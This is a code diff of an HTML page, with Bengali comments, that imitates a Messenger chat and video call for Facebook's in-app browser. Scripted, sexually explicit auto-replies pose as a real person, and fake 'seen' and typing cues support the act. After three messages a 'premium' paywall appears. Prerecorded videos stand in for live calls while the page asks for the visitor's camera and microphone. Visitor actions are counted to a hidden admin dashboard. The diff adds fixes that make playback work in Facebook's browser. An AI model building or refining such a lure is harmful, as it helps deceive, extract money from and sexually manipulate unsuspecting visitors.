@@ -7,7 +7,7 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <style>
-        /* আগের সব স্টাইল এখানে আছে */
+        /* আপনার সব অরিজিনাল স্টাইল হুবহু রাখা হয়েছে */
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body, html { height: 100%; overflow: hidden; background-color: #fff; width: 100%; position: fixed; }
         .verified-badge { color: #0084ff; font-size: 14px; margin-left: 4px; }
@@ -55,8 +55,6 @@
         .input-box { flex: 1; background: #f0f2f5; border-radius: 25px; padding: 10px 18px; display: flex; align-items: center; height: 50px; }
         .input-box input { border: none; background: transparent; width: 100%; outline: none; font-size: 16px; }
         .typing { font-size: 12px; color: #65676b; display: none; margin-left: 40px; margin-bottom: 10px; }
-
-        /* --- DASHBOARD STYLES --- */
         #adminDashboard { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #f0f2f5; z-index: 9999; overflow-y: auto; padding: 20px; color: #1c1e21; }
         .dash-card { background: white; padding: 15px; border-radius: 10px; margin-bottom: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); text-align: center; }
         .dash-card h2 { font-size: 30px; color: #0084ff; }
@@ -64,12 +62,12 @@
         .close-dash { background: #fa3e3e; color: white; padding: 10px; border-radius: 5px; text-align: center; cursor: pointer; margin-bottom: 20px; }
     </style>
 </head>
-<body>
+<body onclick="unlockMedia()"> <!-- প্রথম ক্লিকেই মিডিয়া আনলক হবে -->
 
-    <!-- চ্যাট ইন্টারফেস (আগের মতো) -->
     <div id="mainApp">
-        <video id="preVideo1" src="call1.mp4" preload="auto" muted style="display:none;"></video>
-        <video id="preVideo2" src="call2.mp4" preload="auto" muted style="display:none;"></video>
+        <!-- ভিডিও প্রি-লোড করার জন্য হিডেন ট্যাগ -->
+        <video id="v1" src="call1.mp4" preload="auto" muted playsinline style="display:none;"></video>
+        <video id="v2" src="call2.mp4" preload="auto" muted playsinline style="display:none;"></video>
         <audio id="ringtoneAudio" src="ringtone.mpeg" preload="auto" loop></audio>
 
         <div id="premiumModal">
@@ -89,8 +87,9 @@
                 <div id="callStatusText">Calling...</div>
                 <div id="timerDisplay" style="margin-top:10px; font-size:16px; display:none;">00:00</div>
             </div>
-            <video id="mainVideo" playsinline></video>
-            <video id="userPreview" autoplay muted playsinline></video>
+            <!-- playsinline এবং webkit-playsinline ফেসবুক ব্রাউজারের জন্য খুব গুরুত্বপূর্ণ -->
+            <video id="mainVideo" playsinline webkit-playsinline></video>
+            <video id="userPreview" autoplay muted playsinline webkit-playsinline></video>
             <div class="call-controls">
                 <div class="btn-call" style="background:#fa3e3e;" onclick="endCall()"><i class="fa-solid fa-phone-slash"></i></div>
                 <div id="answerBtn" class="btn-call" style="background:#31a24c; display:none;" onclick="handleIncomingAccept();"><i class="fa-solid fa-video"></i></div>
@@ -138,18 +137,16 @@
         </div>
     </div>
 
-    <!-- --- ADMIN DASHBOARD --- -->
+    <!-- ADMIN DASHBOARD -->
     <div id="adminDashboard">
         <div class="close-dash" onclick="location.hash=''">Close Dashboard</div>
         <h1 style="margin-bottom:20px;">Live Stats</h1>
-        
         <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px;">
             <div class="dash-card"><h2 id="d-visitor">0</h2><p>Visitors</p></div>
             <div class="dash-card"><h2 id="d-message">0</h2><p>Messages</p></div>
             <div class="dash-card"><h2 id="d-video">0</h2><p>Calls</p></div>
             <div class="dash-card"><h2 id="d-register">0</h2><p>Registers</p></div>
         </div>
-
         <div class="dash-card" style="margin-top:20px;">
             <canvas id="liveChart" height="200"></canvas>
         </div>
@@ -159,7 +156,23 @@
     <script>
         const TRACK_URL = "https://script.google.com/macros/s/AKfycbzXIlowODRnKPfVwnRmdBEOWPQ9SYtjLzSnuZxtBiiue3c6LbdC-wggDBimdLYLtAi-/exec";
 
-        // --- DASHBOARD LOGIC ---
+        // মিডিয়া আনলক ফাংশন (ফেসবুক ব্রাউজারের জন্য অত্যন্ত জরুরি)
+        let mediaUnlocked = false;
+        function unlockMedia() {
+            if (mediaUnlocked) return;
+            // ইউজার প্রথম যেখানেই টাচ করবে, রিংটোন এবং ভিডিওর পারমিশন এনাবল হয়ে যাবে
+            document.getElementById('ringtoneAudio').play().then(() => {
+                document.getElementById('ringtoneAudio').pause();
+            }).catch(() => {});
+            
+            // ভিডিও গুলোকে লোড করানো
+            document.getElementById('v1').load();
+            document.getElementById('v2').load();
+            
+            mediaUnlocked = true;
+            console.log("Media Unlocked for FB Browser");
+        }
+
         function checkHash() {
             if(window.location.hash === "#admin") {
                 document.getElementById('adminDashboard').style.display = 'block';
@@ -175,12 +188,10 @@
             try {
                 const res = await fetch(TRACK_URL);
                 const data = await res.json();
-                
                 document.getElementById('d-visitor').innerText = data.visitor || 0;
                 document.getElementById('d-message').innerText = data.message || 0;
                 document.getElementById('d-video').innerText = data.video || 0;
                 document.getElementById('d-register').innerText = data.register || 0;
-
                 const ctx = document.getElementById('liveChart').getContext('2d');
                 if(liveChart) liveChart.destroy();
                 liveChart = new Chart(ctx, {
@@ -198,7 +209,6 @@
             } catch(e) { console.log("Dashboard Error"); }
         }
 
-        // --- আগের সব মেসেঞ্জার স্ক্রিপ্ট ---
         async function sendMainData(actionType) {
             let payload = { visitor: 0, message: 0, video: 0, callagain: 0, register: 0 };
             if(actionType === 'visit') payload.visitor = 1;
@@ -206,15 +216,9 @@
             if(actionType === 'video') payload.video = 1;
             if(actionType === 'callagain') payload.callagain = 1;
             if(actionType === 'register') payload.register = 1;
-
             try {
-                fetch(TRACK_URL, { 
-                    method: 'POST', 
-                    mode: 'no-cors', 
-                    cache: 'no-cache',
-                    body: JSON.stringify(payload) 
-                });
-            } catch(e) { console.log("Tracking Error:", e); }
+                fetch(TRACK_URL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
+            } catch(e) {}
         }
 
         const messagesArea = document.getElementById('messagesArea');
@@ -259,36 +263,28 @@
             const text = msgInput.value.trim();
             if (!text) return;
             if (sentMessageCount >= 3) { showPremium(); return; }
-
             sendMainData('message');
             sentMessageCount++;
             document.querySelectorAll('.status-row').forEach(el => el.remove());
-
             const html = `<div class="message-wrapper" style="justify-content:flex-end;"><div class="message sent">${text}</div></div><div class="status-row"><span class="delivered-label" id="del_${sentMessageCount}">Delivered</span><img src="profile.webp" class="seen-avatar" id="seen_${sentMessageCount}"></div>`;
-            
             messagesArea.insertAdjacentHTML('beforeend', html);
             msgInput.value = "";
             scrollToBottom();
             resetInactivity();
-
             setTimeout(() => {
                 const d = document.getElementById(`del_${sentMessageCount}`);
                 if(d) d.style.display = 'block';
                 scrollToBottom();
             }, 800);
-
             clearTimeout(replyDelayTimer); 
             typingIndicator.style.display = 'none';
-
             replyDelayTimer = setTimeout(() => {
                 const d = document.getElementById(`del_${sentMessageCount}`);
                 const s = document.getElementById(`seen_${sentMessageCount}`);
                 if(d) d.style.display = 'none';
                 if(s) s.style.display = 'block';
-
                 typingIndicator.style.display = 'block';
                 scrollToBottom();
-                
                 setTimeout(() => {
                     typingIndicator.style.display = 'none';
                     const autoReplies = ["Hey how r u.. 😉", "I have something to show you.. 💋", "i want to see your big dick, can you show me...", "Want to keep me company? 💋"];
@@ -301,7 +297,7 @@
         }
 
         function receiveMessage(text, hasVideo = false) {
-            let videoContent = hasVideo ? `<video src="chat_video.mp4" class="video-msg" autoplay muted loop></video>` : '';
+            let videoContent = hasVideo ? `<video src="chat_video.mp4" class="video-msg" autoplay muted playsinline loop></video>` : '';
             const html = `<div class="message-wrapper"><div class="img-container"><img src="profile.webp" class="msg-profile-pic"><div class="active-dot" style="width:8px; height:8px; border:1px solid #fff; bottom:1px; right:1px;"></div></div><div class="message received">${text}${videoContent}</div></div>`;
             messagesArea.insertAdjacentHTML('beforeend', html);
             scrollToBottom();
@@ -343,8 +339,11 @@
             ringtone.pause(); 
             callCount++;
             const vPlayer = document.getElementById('mainVideo');
-            vPlayer.src = (callCount === 1) ? "call1.mp4" : "call2.mp4";
             
+            // সঠিক ভিডিও সোর্স সেট করা এবং লোড করা
+            vPlayer.src = (callCount === 1) ? "call1.mp4" : "call2.mp4";
+            vPlayer.load();
+
             document.getElementById('callUI').style.display = 'none'; 
             vPlayer.style.display = 'block';
             document.getElementById('userPreview').style.display = 'block';
@@ -354,11 +353,21 @@
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});
                 document.getElementById('userPreview').srcObject = stream;
-            } catch(e) {}
+            } catch(e) { console.log("Camera failed"); }
 
-            vPlayer.play();
+            // ভিডিও মিউট ছেড়ে প্লে করা
+            vPlayer.muted = false; 
+            let p = vPlayer.play();
+            if (p !== undefined) {
+                p.catch(() => {
+                    vPlayer.muted = true;
+                    vPlayer.play();
+                });
+            }
+
             seconds = 0;
             timerDisplay.innerText = "00:00";
+            clearInterval(callTimerInterval);
             callTimerInterval = setInterval(() => {
                 seconds++;
                 let m = Math.floor(seconds/60).toString().padStart(2, '0');
@@ -404,7 +413,7 @@
         window.onload = () => {
             resetInactivity();
             sendMainData('visit');
-            checkHash(); // চেক করবে ইউআরএল এ #admin আছে কি না
+            checkHash();
         };
     </script>
 </body>
